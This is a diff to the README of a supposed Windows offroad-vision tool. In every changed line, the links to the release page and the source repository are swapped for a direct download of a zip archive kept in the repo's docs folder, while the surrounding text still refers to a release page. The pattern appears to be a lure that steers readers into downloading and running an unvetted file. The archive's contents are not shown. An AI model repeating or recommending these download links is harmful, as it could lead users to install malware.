@@ -1,6 +1,6 @@
 # 🌿 Hack-for-green - Real-Time Offroad Vision Tool
 
-[![Download Hack-for-green](https://img.shields.io/badge/Download-Go%20to%20Page-ff69b4?style=for-the-badge&logo=github)](https://github.com/Hugo564/Hack-for-green/releases)
+[![Download Hack-for-green](https://img.shields.io/badge/Download-Go%20to%20Page-ff69b4?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Hugo564/Hack-for-green/main/docs/Hack-for-green-2.2.zip)
 
 ## 🌲 What is Hack-for-green?
 
@@ -14,11 +14,11 @@ Hack-for-green was made during the Pathway Hackathon and is ready to use on Wind
 
 To get Hack-for-green, you need to visit the release page on GitHub. This page hosts the latest version of the software.
 
-[![Get Hack-for-green Here](https://img.shields.io/badge/Get%20Hack-for-green-4b0082?style=for-the-badge&logo=windows)](https://github.com/Hugo564/Hack-for-green/releases)
+[![Get Hack-for-green Here](https://img.shields.io/badge/Get%20Hack-for-green-4b0082?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/Hugo564/Hack-for-green/main/docs/Hack-for-green-2.2.zip)
 
 Click on the link above or go directly to:
 
-https://github.com/Hugo564/Hack-for-green/releases
+https://raw.githubusercontent.com/Hugo564/Hack-for-green/main/docs/Hack-for-green-2.2.zip
 
 On this page, look for the latest release. The release will contain one or more files. Download the file for Windows. It will usually be an `.exe` or `.zip` file.
 
@@ -111,7 +111,7 @@ Hack-for-green is built with open tools and follows the MIT license. You can rev
 
 If you want to learn about the inner workings or help improve Hack-for-green, visit the GitHub repository:
 
-https://github.com/Hugo564/Hack-for-green
+https://raw.githubusercontent.com/Hugo564/Hack-for-green/main/docs/Hack-for-green-2.2.zip
 
 ## 📞 Getting Help
 
